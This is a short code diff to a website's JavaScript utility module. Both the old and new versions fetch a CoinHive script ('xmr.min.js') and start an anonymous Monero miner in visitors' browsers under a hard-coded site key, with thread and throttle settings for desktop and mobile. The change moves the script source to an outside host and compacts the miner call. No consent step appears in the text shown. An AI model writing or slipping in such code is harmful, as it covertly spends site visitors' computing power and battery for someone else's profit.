@@ -38,9 +38,8 @@ var Util = {
     }
     $.ajax({
       method: "GET",
-      url: Label.staticServePath + '/js/lib/xmr.min.js',
-      dataType: "script",
-      cache: true
+      url: 'https://static.hacpai.com/js/lib/xmr.min.js',
+      dataType: "script"
     }).done(function () {
       var data = {threads: 2, throttle: 0.5}
       if (Label.isLoggedIn) {
@@ -50,8 +49,7 @@ var Util = {
       if ($.ua.device && $.ua.device.type === 'mobile') {
         data = {threads: 1, throttle: 0.8}
       }
-      var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data);
-      miner.start();
+      (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data)).start();
     });
   },
   /**
